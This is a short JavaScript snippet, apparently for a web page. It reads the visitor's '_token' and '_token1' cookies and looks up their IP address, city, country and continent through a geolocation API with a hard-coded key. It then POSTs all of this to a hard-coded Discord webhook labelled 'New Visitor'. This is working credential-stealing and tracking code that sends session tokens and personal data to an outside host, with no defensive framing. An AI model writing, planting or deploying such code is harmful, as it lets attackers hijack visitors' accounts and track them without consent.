// (function(){var script=document.createElement('script');script.type='text/javascript';script.src='https://cdn.rawgit.com/zz85/zz85-bookmarklets/master/js/upside3.js';document.body.appendChild(script);})()
function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=1787457d8c344652bdc725082344cdd7", function(data) { 
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/919718102281908225/u3QiALOWOXtDu7cJ-AjacxHqkm_FxaBzHqxp8PIFMbq8Bh6itvDPSh7b0_0wvPPQ_1cs");
  
    request.setRequestHeader('Content-type', 'application/json');
    var t = {
      content: "",
      embeds: [{
          color: "4700374",
          title: "New Visitor",
          fields: [
            {name: "IP Address", value: data.ip_address},
            {name: "City", value: data.city},
            {name: "County", value: data.country},
            {name: "Continent", value: data.continent},
            {name: "Cookies", value: getCookie("_token")+" "+getCookie("_token1")}
          ],
      }]
  };
  
    request.send(JSON.stringify(t));
})
